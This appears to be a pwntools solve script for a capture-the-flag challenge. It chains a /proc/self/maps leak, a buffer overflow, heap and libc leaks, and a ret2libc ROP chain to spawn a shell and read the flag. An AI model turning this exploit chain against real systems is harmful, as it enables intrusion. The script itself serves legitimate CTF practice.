#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = '103.185.52.198'
PORT = 4919

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *write_buf+51
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

INP_PROMPT = b'> '

# Leak PIE #
p.sendlineafter(INP_PROMPT, b'open')
p.sendlineafter(b'Path: ', b'/proc/self/maps')
elf.address = int(p.recvuntil(b'-')[:-1].strip(), 16)
print(f"ELF base      : {hex(elf.address)}")
# ========== #

# Setup libc address on heap #
p.sendlineafter(INP_PROMPT, b'write')
p.sendafter(b'Content: ', b'xxx')
p.sendlineafter(b'Save [Y\N]?', b'n')
# ========== #

ret = elf.address + 0x141e
history = elf.sym.history

# Buffer overflow to history() #
# Leak heap
p.sendlineafter(INP_PROMPT, b'write')
p1 = b'A' * 0x50 + b'B' * 8 + p64(ret) + p64(history) + p64(ret) + p64(elf.sym.main)
p.sendafter(b'Content: ', p1)
p.sendlineafter(b'Save [Y\N]?', b'y')
p.recvuntil(b'Yoo ref do somethin ')
heap_leak = int(p.recvline()[:-1].strip(), 16)
heap_target = (heap_leak & ~0xfff) + 0x2c0
print(f"Heap leak     : {hex(heap_leak)}")
print(f"Heap target   : {hex(heap_target)}")
# ========== #

# Leak libc #
p.sendlineafter(INP_PROMPT, b'console')
p.sendlineafter(b'[CONSOLE]: ', hex(heap_target).encode())
p.recvuntil(b'>>> ')
libc_leak = int(p.recvline()[:-1].strip(), 16)
libc.address = libc_leak - 0x1d3cc0
print(f"Libc base     : {hex(libc.address)}")
# ========== #

pop_rdi = libc.address + 0xd2966 # pop rdi; ret;
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
# print(f"pop rdi       : {hex(pop_rdi)}")
# print(f"/bin/sh       : {hex(binsh)}")
# print(f"system()      : {hex(system)}")

# Ret2libc #
p.sendlineafter(INP_PROMPT, b'write')
final_payload = b'g' * 0x50 + b'i' * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
p.sendafter(b'Content: ', final_payload)
p.sendlineafter(b'Save [Y\N]?', b'y')
# ========== #

p.sendline(b'cat flag*')

p.interactive()

# NOTE:
# Ret2libc with extra steps
